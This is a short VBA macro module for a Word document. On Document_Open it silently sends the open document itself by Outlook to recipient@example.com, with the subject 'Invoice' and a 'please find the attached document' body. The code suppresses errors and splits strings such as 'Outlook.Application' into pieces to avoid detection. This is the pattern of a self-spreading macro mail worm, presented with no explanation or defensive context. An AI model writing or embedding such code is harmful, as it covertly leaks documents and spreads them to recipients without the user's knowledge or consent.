Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    Set olApp = CreateObject("Outlo" & "ok.Appli" & "cation")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "recipient@example.com"
    olMail.Subject = "Invoice"
    olMail.Body = "Please" & " find t" & "he attach" & "ed doc" & "ument."
    olMail.Attachments.Add ActiveDocument.FullName
    olMail.Send
End Sub
